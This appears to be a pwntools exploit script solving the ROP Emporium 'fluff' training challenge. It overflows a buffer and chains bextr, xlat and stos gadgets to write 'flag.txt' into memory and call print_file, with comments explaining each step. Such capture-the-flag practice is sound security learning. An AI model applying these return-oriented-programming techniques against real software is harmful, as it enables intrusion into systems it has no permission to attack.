#!/usr/bin/env python3

from pwn import *

e = ELF("./fluff")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "10.10.10.10"  # Remote host IP
PORT = 1337  # Remote port

gdb_script = """
b main
b *0x00000000004006a3
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    p          = conn()  # Establish connection to target
    offset     = 40  # Offset to control return address
    write_addr = 0x601038 # readelf -S fluff | grep .bss
    print_file = 0x400510 # Addr to print_file
    popRDI     = 0x4006a3 # pop rdi ; ret
    xlat       = 0x400628 # xlat   BYTE PTR ds:[rbx]
    bextr      = 0x40062a # pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx,rcx,rdx
    stos       = 0x400639 # stos   BYTE PTR es:[rdi],al
    file_name  = "flag.txt"
    addresess  = []
    payload    = []
    # It's not possible to send the characters directly due to the unusual gadgets present in the binary. To construct the flag.txt string, it is necessary to locate specific parts of the binary that already contain those characters.
    for ch in file_name:
        ch_addr = read('fluff').find(ch.encode())
        ch_addr = ch_addr + e.address
        info(f"Address for character [{ch}]: \t{hex(ch_addr)}")
        addresess.append(ch_addr)
    # This is the manual way to get the addr
    # f   = 964 + e.address # grep -aobF $'\x66' fluff | head -n 1 
    # l   = 569 + e.address # grep -aobF $'\x6C' fluff | head -n 1 
    # a   = 982 + e.address # grep -aobF $'\x61' fluff | head -n 1
    # g   = 975 + e.address # grep -aobF $'\x67' fluff | head -n 1
    # dot = 590 + e.address # grep -aobF $'\x2E' fluff | head -n 1
    # t   = 402 + e.address # grep -aobF $'\x74' fluff | head -n 1
    # x   = 582 + e.address # grep -aobF $'\x78' fluff | head -n 1
    # t   = 402 + e.address # grep -aobF $'\x74' fluff | head -n 1
    # info(f"f: {hex(f)}")    
    # info(f"l: {hex(l)}")    
    # info(f"a: {hex(a)}")    
    # info(f"g: {hex(g)}")    
    # info(f".: {hex(dot)}")    
    # info(f"t: {hex(t)}")    
    # info(f"x: {hex(x)}")
    # info(f"t: {hex(t)}")    
    payload.extend([popRDI, write_addr])  # The gadget loads into RDI the memory address (write_addr), which will later be used to store the flag.txt string.
    al = 0xb # The value that AL has at this point
    for i in range(len(addresess)):
        info(f"Writing {file_name[i]} into {hex(write_addr + i)}...")
        ch_addr = addresess[i]
        rcx = ch_addr - 0x3ef2 # 0x3ef2 is subtracted from ch_addr because the gadget will later add 0x3ef2
        rcx -= al
        # Subtract AL from RCX so that when XLAT indexes memory at [RBX + AL] and loads the byte into AL, the byte obtained corresponds to the desired value.
        rdx = 0x5000 # Large value to make sure rbx will be correctly set
        payload.extend([bextr, rdx, rcx]) # Now in rbx will be the letter of the iteration
        payload.append(xlat) # XLAT will store the value in [RBX + AL] and store it in AL 
        payload.append(stos) # STOS will write the value of AL in the addr pointed by RDI and then will increment the addr of RDI by one
        al = ord(file_name[i]) # Store the value that has al for in the next iteration substractit to rcx 
    payload.extend([popRDI, write_addr]) # Because STOS was incrementing all the time the addr of rdi is needed to write another time the addr of where is now stored flag.txt in to RDI
    payload.append(print_file) # finally call print_file with flag.txt as an argument
    payload = flat({offset: payload})  # Flatten payload for sending
    p.sendlineafter(b'>', payload) # Send payload
    p.interactive()  # Hand over interaction to user for shell or output
if __name__ == "__main__":
    main()

